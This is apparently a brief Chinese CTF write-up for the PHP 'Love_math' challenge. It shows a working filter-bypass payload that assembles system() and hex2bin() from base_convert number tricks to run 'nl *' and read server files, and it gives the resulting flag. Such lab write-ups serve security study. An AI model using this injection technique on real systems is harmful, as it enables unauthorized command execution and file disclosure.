# Love_math

## 思路分析

> 打开能看到源码,从源码上来看是要构造c参数,来达到执行命令或读取文件的目的.其中必须得用提示的那些数学函数,想执行命令,就得有字符,所以需要base_convert函数进行任意进制转换,

## payload

> ($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))

> 这段payload的含义是base_convert(1751504350,10,36)(base_convert(1438255411,14,34)(dechex(1852579882)))

```
base_convert(1751504350,10,36) system
base_convert(1438255411,14,34) hex2bin
dechex(1852579882) 6e6c202a
```

> system(hex2bin(6e6c202a))

> system(nl *)

## flag

> flag{dgjregjvdsmvba356sg}

## 参考

> https://blog.csdn.net/weixin_44897902/article/details/102548706